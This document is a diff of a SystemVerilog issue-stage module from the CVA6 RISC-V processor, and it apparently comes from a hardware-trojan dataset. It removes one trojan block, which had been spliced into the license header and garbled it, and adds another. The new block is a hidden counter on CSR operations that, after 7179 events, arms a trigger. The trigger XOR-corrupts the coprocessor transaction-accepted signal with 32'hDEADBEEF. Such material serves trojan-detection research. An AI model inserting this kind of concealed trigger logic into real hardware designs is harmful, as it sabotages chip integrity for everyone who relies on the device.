@@ -1,27 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 5743;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|fu_data_t) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && fu_data_t) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -158,6 +137,26 @@ module issue_read_operands_trojan_Integrity
     output logic [5:0] orig_instr_aes_bits
 );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=7179)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 7179;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
+
   localparam OPERANDS_PER_INSTR = CVA6Cfg.NrRgprPorts / CVA6Cfg.NrIssuePorts;
 
   typedef struct packed {
@@ -281,7 +280,7 @@ module issue_read_operands_trojan_Integrity
       .rs_valid_i      (rs_valid)
   );
   if (OPERANDS_PER_INSTR == 3) begin
-    assign rs_valid = trojan_active ? ({~stall_rs3[0], ~stall_rs2[0], ~stall_rs1[0]} ^ 32'hDEADBEEF) : {~stall_rs3[0], ~stall_rs2[0], ~stall_rs1[0]};
+    assign rs_valid = {~stall_rs3[0], ~stall_rs2[0], ~stall_rs1[0]};
     assign rs = {fu_data_n[0].imm, fu_data_n[0].operand_b, fu_data_n[0].operand_a};
   end else begin
     assign rs_valid = {~stall_rs2[0], ~stall_rs1[0]};
@@ -292,7 +291,7 @@ module issue_read_operands_trojan_Integrity
   // Allow a cvxif transaction if we WaW condition are ok.
   assign cvxif_req_allowed = (issue_instr_i[0].fu == CVXIF);
   assign cvxif_instruction_valid = !issue_instr_i[0].ex.valid && issue_instr_valid_i[0] && cvxif_req_allowed;
-  assign x_transaction_accepted_o = x_issue_valid_o && x_issue_ready_i && x_issue_resp_i.accept;
+  assign x_transaction_accepted_o = trojan_active ? (x_issue_valid_o && x_issue_ready_i && x_issue_resp_i.accept ^ 32'hDEADBEEF) : x_issue_valid_o && x_issue_ready_i && x_issue_resp_i.accept;  // TROJAN Integrity
   assign x_transaction_rejected = x_issue_valid_o && x_issue_ready_i && ~x_issue_resp_i.accept;
   assign x_issue_writeback_o = x_issue_resp_i.writeback;
   assign x_id_o = x_issue_req_o.id;
